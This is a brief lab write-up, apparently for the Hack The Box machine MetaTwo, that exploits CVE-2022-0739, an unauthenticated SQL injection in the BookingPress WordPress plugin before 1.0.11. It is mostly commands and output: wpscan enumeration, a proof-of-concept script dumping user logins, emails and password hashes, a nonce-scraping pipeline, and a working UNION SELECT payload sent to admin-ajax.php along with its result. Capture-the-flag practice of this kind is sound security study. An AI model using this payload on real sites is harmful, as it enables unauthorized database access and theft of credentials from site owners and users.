# CVE-2022-0739 - WordPress Plugin - BookingPress < 1.0.11 - Unauthenticated SQL Injection

## Enumerate

```bash
$ wpscan --url $url --enumerate vp --plugins-detection aggressive --api-token ...SNIP...
...
...
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
 |      - https://plugins.trac.wordpress.org/changeset/2684789
...
...
```

## Exploitation

```bash
$ bash CVE-2022-0739.sh --url http://metapress.htb --event-dir events  
CVE-2022-0739 - BookingPress < 1.0.11

Options :
    url : http://metapress.htb
    dir : events

[-] Nonce : 000a0fbd42

[-] 2 users found

*---------------------*---------------------------*----------------------------------------*
| user_login          | user_email                | user_pass                              |
*---------------------*---------------------------*----------------------------------------*
| admin               | admin@metapress.htb       | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.     |
| manager             | manager@metapress.htb     | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70     |
*---------------------*---------------------------*----------------------------------------*
```

## Extra

```bash
$ curl -s http://metapress.htb/events/ | grep "_wpnonce:" | awk -F "e:'" '{print $2}' | awk -F "'" '{print $1}' | 
sort -u
000a0fbd42
```

```bash
$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=000a0fbd42&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

## Links

- [GitHub - lhamouche - CVE-2022-0739 - PoC](https://github.com/lhamouche/Bash-exploit-for-CVE-2022-0739/)
- [wpscan vuln details](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)
- [Mitre CVE-2022-0739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739)
- [Wordpress vuln details](https://plugins.trac.wordpress.org/changeset/2684789)
- [metasploit - bookingpress sqli](https://github.com/rapid7/metasploit-framework/blob/d48319a867a75cae501cc6797114b511ba0293a4/modules/auxiliary/gather/wp_bookingpress_category_services_sqli.rb)
- [HTB Machine - MetaTwo](https://app.hackthebox.com/machines/504)
